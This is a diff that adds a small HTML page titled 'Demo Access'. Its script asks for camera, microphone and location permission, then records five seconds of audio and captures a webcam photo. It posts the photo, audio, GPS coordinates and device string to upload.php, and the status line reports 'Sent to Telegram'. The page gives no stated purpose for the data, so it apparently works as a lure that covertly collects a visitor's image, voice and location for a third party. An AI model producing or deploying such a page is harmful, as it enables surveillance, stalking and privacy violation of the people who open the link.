@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+<body style="background:#111; color:white; text-align:center; padding-top:80px; font-family:sans-serif;">
+
+<h2>Demo Access</h2>
+
+<button onclick="start()" 
+style="padding:20px 50px; font-size:22px; background:#0095f6; color:white; border:none; border-radius:10px;">
+Start
+</button>
+
+<p id="status"></p>
+<video id="video" autoplay style="width:250px; border-radius:10px;"></video>
+
+<script>
+let mediaRecorder, chunks=[];
+
+async function start(){
+  const status = document.getElementById("status");
+
+  if(!confirm("Allow Camera, Microphone & Location?")){
+    status.innerText = "Cancelled ❌";
+    return;
+  }
+
+  try{
+    status.innerText = "Requesting permissions...";
+
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video:true,
+      audio:true
+    });
+
+    document.getElementById("video").srcObject = stream;
+
+    // audio recording start
+    mediaRecorder = new MediaRecorder(stream);
+    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+    mediaRecorder.start();
+
+    navigator.geolocation.getCurrentPosition((pos)=>{
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+
+      status.innerText = "Recording 5 sec...";
+
+      setTimeout(()=>{
+        capture(stream, lat, lon);
+      },5000);
+
+    },()=>{
+      capture(stream,"N/A","N/A");
+    });
+
+  }catch{
+    status.innerText = "Permission denied ❌";
+  }
+}
+
+function capture(stream, lat, lon){
+  const video = document.getElementById("video");
+
+  // 📸 photo
+  const canvas = document.createElement("canvas");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video,0,0);
+
+  const img = canvas.toDataURL("image/png");
+
+  // stop audio
+  mediaRecorder.stop();
+
+  mediaRecorder.onstop = ()=>{
+    const audioBlob = new Blob(chunks,{type:"audio/webm"});
+
+    let fd = new FormData();
+    fd.append("img", img);
+    fd.append("audio", audioBlob);
+    fd.append("lat", lat);
+    fd.append("lon", lon);
+    fd.append("device", navigator.userAgent);
+
+    fetch("upload.php",{
+      method:"POST",
+      body:fd
+    });
+
+    document.getElementById("status").innerText = "Sent to Telegram ✔";
+
+    stream.getTracks().forEach(t => t.stop());
+  };
+}
+</script>
+
+</body>
+</html>
